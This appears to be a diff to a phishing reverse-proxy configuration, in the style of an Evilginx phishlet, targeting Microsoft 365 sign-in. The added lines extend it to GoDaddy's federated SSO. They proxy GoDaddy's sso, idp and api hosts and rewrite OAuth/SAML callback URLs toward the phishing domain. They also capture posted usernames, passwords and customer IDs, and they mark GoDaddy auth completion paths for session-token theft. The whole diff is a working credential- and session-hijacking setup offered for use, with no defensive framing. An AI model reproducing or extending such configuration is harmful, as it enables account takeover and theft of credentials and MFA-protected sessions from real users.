@@ -28,6 +28,11 @@ proxy_hosts:
   - {phish_sub: 'fs', orig_sub: 'fs', domain: '*', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'sts', orig_sub: 'sts', domain: '*', session: true, is_landing: false, auto_filter: true}
 
+  # GoDaddy auth hosts (capture GoDaddy SSO / API flows)
+  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'idp', orig_sub: 'idp', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'godaddy.com', session: false, is_landing: false, auto_filter: true}
+
 sub_filters:
   # Strip SRI integrity hashes — auto_filter modifies CDN JS content, breaking the hash
   - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: ' integrity=''[^'']*''', replace: '', mimes: ['text/html']}
@@ -74,6 +79,18 @@ sub_filters:
   - {triggers_on: 'adfs.*', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'fs.*', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'sts.*', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  # GoDaddy SSO — rewrite Microsoft callback URLs so the OAuth/SAML return lands on the phished Microsoft domain
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'login', domain: 'windows.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'idp', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  # GoDaddy IdP — same rewrite for the IdP sub-pages
+  - {triggers_on: 'idp.godaddy.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'idp.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  # Also rewrite GoDaddy SSO/IdP references within the Microsoft login page (HRD redirect target)
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'idp', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
 
 auth_tokens:
   # Microsoft primary auth cookies
@@ -162,6 +179,12 @@ credentials:
     - {key: 'code', search: '(.*)', type: 'post'}
     - {key: 'otp', search: '(.*)', type: 'post'}
     - {key: 'pin', search: '(.*)', type: 'post'}
+    # GoDaddy SSO JSON fields — sso.godaddy.com POSTs JSON with customerId/shopperId + password
+    - {key: 'customerId', search: '(.*)', type: 'json'}
+    - {key: 'shopperId', search: '(.*)', type: 'json'}
+    - {key: 'username', search: '(.*)', type: 'json'}
+    - {key: 'password', search: '(.*)', type: 'json'}
+    - {key: 'Password', search: '(.*)', type: 'json'}
 
 auth_urls:
   # Microsoft completion endpoints
@@ -183,6 +206,14 @@ auth_urls:
   - '/winauth/trust/'
   # ADFS
   - '/adfs/ls/'
+  # GoDaddy SSO completion paths
+  - '/v1/secure/auth'
+  - '/v1/secure/auth/complete'
+  - '/idp/auth'
+  - '/idp/login'
+  - '/idp/consent'
+  - '/callback'
+  - '/oauth2/callback'
 
 login:
   domain: 'login.microsoftonline.com'
